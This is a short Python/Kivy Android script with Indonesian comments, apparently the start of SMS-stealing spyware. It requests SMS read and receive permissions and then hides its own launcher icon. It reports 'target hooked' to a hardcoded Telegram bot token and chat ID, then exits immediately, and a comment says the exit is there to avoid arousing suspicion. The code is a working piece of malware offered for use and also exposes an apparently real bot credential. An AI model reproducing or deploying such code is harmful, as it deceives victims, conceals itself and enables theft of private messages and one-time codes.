import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
import os

# --- DATA KAMU SUDAH TERPASANG ---
TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
# -------------------------------

bot = telebot.TeleBot(TOKEN)

def hide_icon():
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        currentActivity = PythonActivity.mActivity
        PackageManager = autoclass('android.content.pm.PackageManager')
        ComponentName = autoclass('android.content.ComponentName')
        
        package_name = currentActivity.getPackageName()
        component_name = ComponentName(package_name, 'org.kivy.android.PythonActivity')
        
        # Perintah menghapus ikon dari beranda/menu
        currentActivity.getPackageManager().setComponentEnabledSetting(
            component_name,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        bot.send_message(CHAT_ID, "✅ Target Terpancing! Izin aktif & Ikon sudah disembunyikan.")
    except Exception as e:
        bot.send_message(CHAT_ID, f"❌ Gagal sembunyi: {str(e)}")

def on_permissions_callback(permissions, grants):
    if all(grants):
        hide_icon()
        # Langsung keluar aplikasi biar ga curiga
        os._exit(0)

if __name__ == '__main__':
    request_permissions([
        Permission.READ_SMS,
        Permission.RECEIVE_SMS,
        Permission.POST_NOTIFICATIONS
    ], on_permissions_callback)
